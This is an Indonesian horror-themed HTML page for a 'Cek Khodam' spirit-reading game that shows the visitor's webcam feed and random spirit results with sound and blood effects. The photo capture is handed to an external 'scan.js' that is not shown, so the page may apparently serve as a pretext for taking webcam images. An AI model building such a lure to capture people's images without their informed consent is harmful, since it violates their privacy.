<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta property="og:title" content="Cek Khodam Dalam Dirimu">
  <meta property="og:description" content="Temukan khodam yang bersemayam dalam dirimu melalui kamera ini!">
  <meta property="og:image" content="https://i.imgur.com/JxQqZzF.png">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Eater&display=swap');
    body {
      margin: 0;
      font-family: 'Eater', cursive;
      background: #000 url('https://i.imgur.com/XdQz4Wj.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #ff0000;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding-top: 20px;
    }
    h1 {
      font-size: 3.5rem;
      margin-bottom: 10px;
      letter-spacing: 3px;
      text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000;
      color: #ff0000;
      text-align: center;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { text-shadow: 0 0 10px #ff0000; }
      50% { text-shadow: 0 0 20px #ff0000, 0 0 30px #8b0000; }
      100% { text-shadow: 0 0 10px #ff0000; }
    }
    #game-desc {
      font-size: 1.2rem;
      margin-bottom: 30px;
      color: #d3d3d3;
      text-align: center;
      max-width: 500px;
      background-color: rgba(0,0,0,0.7);
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #8b0000;
    }
    #face-challenge {
      font-size: 3rem;
      margin: 20px 0;
      text-align: center;
      background: rgba(0,0,0,0.8);
      border-radius: 16px;
      padding: 18px 30px;
      box-shadow: 0 0 16px #ff0000;
      min-width: 280px;
      min-height: 60px;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: 0.3s;
      border: 2px solid #8b0000;
    }
    .emoji {
      font-size: 3rem;
      margin: 0 10px;
    }
    button {
      background-color: #8b0000;
      border: none;
      padding: 15px 40px;
      font-size: 1.3rem;
      border-radius: 10px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      margin: 12px;
      transition: 0.2s;
      box-shadow: 0 0 10px #ff0000;
      text-shadow: 0 0 5px #000;
    }
    button:hover {
      background-color: #ff0000;
      color: #000;
      box-shadow: 0 0 20px #ff0000;
    }
    #webcam-container {
      margin-top: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
      position: relative;
    }
    #video {
      border: 4px solid #8b0000;
      border-radius: 18px;
      width: 500px;
      height: 375px;
      background: #000;
      object-fit: cover;
      box-shadow: 0 0 24px #ff0000;
      margin-bottom: 10px;
      filter: brightness(0.7) contrast(1.2);
    }
    #result {
      font-size: 1.5rem;
      color: #ff0000;
      margin-top: 10px;
      min-height: 30px;
      text-shadow: 0 0 10px #000;
      text-align: center;
      background-color: rgba(0,0,0,0.7);
      padding: 15px;
      border-radius: 10px;
      border: 1px solid #8b0000;
      width: 80%;
    }
    #preview {
      margin-top: 15px;
      border: 2px solid #8b0000;
      border-radius: 12px;
      width: 250px;
      height: 188px;
      object-fit: cover;
      background: #000;
      display: none;
      filter: sepia(0.5) hue-rotate(300deg);
    }
    canvas { display: none; }
    footer {
      margin-top: 40px;
      font-size: 0.9rem;
      color: #8b0000;
      text-shadow: 0 0 5px #000;
    }
    .blood {
      position: fixed;
      pointer-events: none;
      z-index: 999;
      animation: drip 4s linear forwards;
    }
    @keyframes drip {
      0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }
  </style>
</head>
<body>
  <h1>üîÆ CEK KHODAM üîÆ</h1>
  <div id="game-desc">
    Biarkan kamera membaca aura dan khodam yang bersemayam dalam dirimu!<br>
    <i>Tekan "Mulai Pembacaan" untuk memulai, lalu "Tangkap Khodam" saat kamu merasakan kehadirannya!</i>
  </div>
  <div id="face-challenge">Tekan tombol untuk memulai...</div>
  <button onclick="newChallenge()">Mulai Pembacaan</button>
  <button onclick="checkFace()">Tangkap Khodam</button>
  <div id="webcam-container">
    <video id="video" autoplay></video>
    <div id="result"></div>
    <img id="preview" alt="Foto Khodam Tertangkap">
  </div>
  <canvas id="canvas"></canvas>
  <footer>
    üîÆ Dibuat oleh: <strong>Pawang Spiritual üîÆ</strong>
  </footer>

  <!-- Script webcam dan efek khusus -->
  <script src="scan.js"></script>
  <script>
    const entities = [
      "üëπ", "üëª", "üíÄ", "üëΩ", "ü§°", "üï∑Ô∏è", "ü¶á", "üêç", "üëÅÔ∏è", "üñ§", "üî•", "üåë"
    ];
    const horrorSounds = [
      "sounds/creepy-laugh.mp3",
      "sounds/ghost-whisper.mp3",
      "sounds/demon-growl.mp3",
      "sounds/wind-howling.mp3"
    ];

    function playRandomSound() {
      const sound = new Audio(horrorSounds[Math.floor(Math.random() * horrorSounds.length)]);
      sound.volume = 0.7;
      sound.play();
    }

    function createBloodEffect() {
      const blood = document.createElement('div');
      blood.className = 'blood';
      blood.innerHTML = 'üíß';
      blood.style.left = Math.random() * window.innerWidth + 'px';
      blood.style.fontSize = (Math.random() * 20 + 10) + 'px';
      document.body.appendChild(blood);
      
      setTimeout(() => {
        blood.remove();
      }, 4000);
    }

    function newChallenge() {
      playRandomSound();
      
      // Efek darah jatuh
      for(let i = 0; i < 5; i++) {
        setTimeout(createBloodEffect, i * 300);
      }

      const idx = Math.floor(Math.random() * entities.length);
      $('#face-challenge').html(`<span class="emoji">${entities[idx]}</span>`);
      $('#result').text('Membaca aura...');
      $('#preview').hide();
      
      // Background flicker
      let flickerCount = 0;
      const flicker = setInterval(() => {
        document.body.style.backgroundColor = flickerCount % 2 === 0 ? '#000000' : '#1a0000';
        flickerCount++;
        if(flickerCount > 6) {
          clearInterval(flicker);
          document.body.style.backgroundColor = '';
        }
      }, 200);
    }

    function checkFace() {
      if (typeof captureFace === 'function') {
        captureFace();
      }

      // Flash merah
      const flash = document.createElement('div');
      flash.style.position = 'fixed';
      flash.style.top = '0';
      flash.style.left = '0';
      flash.style.width = '100vw';
      flash.style.height = '100vh';
      flash.style.backgroundColor = '#ff0000';
      flash.style.opacity = '0.5';
      flash.style.zIndex = '9999';
      document.body.appendChild(flash);
      setTimeout(() => flash.remove(), 150);

      // Suara mistis
      const clickSound = new Audio('sounds/ghostly-scream.mp3');
      clickSound.volume = 0.6;
      clickSound.play();

      // Efek darah tambahan
      for(let i = 0; i < 8; i++) {
        setTimeout(createBloodEffect, i * 200);
      }

      // Hasil pembacaan
      setTimeout(() => {
        playRandomSound();

        const khodamTypes = ["Jin Merah", "Genderuwo", "Kuntilanak", "Pocong", "Tuyul", "Wewe Gombel"];
        const strength = Math.floor(Math.random() * 101);
        const type = khodamTypes[Math.floor(Math.random() * khodamTypes.length)];
        
        $('#result').html(`
          üîÆ <b>KHODAM TERDETEKSI!</b> üîÆ<br>
          Jenis: <b>${type}</b><br>
          Kekuatan: <b>${strength}%</b><br>
          ${strength > 70 ? "‚ö†Ô∏è WASPADA! Khodam ini sangat kuat!" : "Khodam ini cukup lemah"}
        `);

        // Animasi hasil
        $('#result').css({ 
          transform: 'scale(0.5) rotate(-5deg)',
          opacity: 0 
        });
        $('#result').animate({ 
          opacity: 1 
        }, {
          duration: 800,
          step: function (now, fx) {
            if (fx.prop === 'opacity') {
              const scale = 0.5 + (now * 0.5);
              $(this).css('transform', `scale(${scale}) rotate(${-5 + (now * 10)}deg)`);
            }
          }
        });
      }, 500);
    }

    // Background sound loop
    window.onload = function() {
      const bgSound = new Audio('sounds/creepy-ambient.mp3');
      bgSound.loop = true;
      bgSound.volume = 0.3;
      bgSound.play();
    };
  </script>
</body>
</html>
